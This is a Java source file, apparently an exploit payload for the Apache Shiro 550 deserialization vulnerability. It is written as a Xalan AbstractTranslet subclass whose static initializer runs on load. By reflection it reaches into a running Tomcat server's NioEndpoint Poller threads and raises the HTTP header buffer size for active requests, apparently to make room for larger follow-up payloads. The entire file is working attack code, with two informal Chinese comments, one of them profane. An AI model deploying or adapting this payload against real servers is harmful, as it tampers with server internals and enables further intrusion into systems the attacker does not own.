package spring_shiro_550.demo.controller;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.Serializable;
import java.lang.reflect.Field;

public class changeTomcatHeaderSizePayload extends AbstractTranslet  {

    public static Object getField(String fieldName, Object o) {
        try {
            Class clazz = o.getClass();
            Field f = null;
            while (clazz != Object.class) {
                try {
                    f = clazz.getDeclaredField(fieldName);
                    if (f == null) {

                    } else {
                        break;
                    }
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                    continue;
                }
            }
            f.setAccessible(true);
            return f.get(o);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void setField(String fieldName, Object value, Object o) {
        try {
            Field f = o.getClass().getDeclaredField(fieldName);
            f.setAccessible(true);
            f.set(o, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object[] getElementData() {
        Object[] elementData = null;
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = (Thread[]) getField("threads", threadGroup);
        for (Thread thread : threads) {
//            这个判断确保thread不为空，会增加长度，但是没有报错，看着舒服。
            if (thread != null) {
                Object thread_target = getField("target", thread);
                if (thread_target instanceof Runnable) {
                    if (thread_target.getClass().getName().equals("org.apache.tomcat.util.net.NioEndpoint$Poller")) {
                        elementData = (Object[]) getField("elementData", getField("processors", getField("global", getField("handler", getField("this$0", thread_target)))));
                    }
                }
            }

        }
        return elementData;
    }

    static {
        //    我不想再写啦，妈的
        Object[] elementData = getElementData();
        for (int i = 0; i < elementData.length; i++) {
            if (elementData[i] == null) break;
            Object requestInfo = elementData[i];
            Object inputBuffer = getField("inputBuffer", (getField("req", requestInfo)));
            setField("headerBufferSize", 40000, inputBuffer);
        }
    }

    public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException {

    }

    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {

    }
}
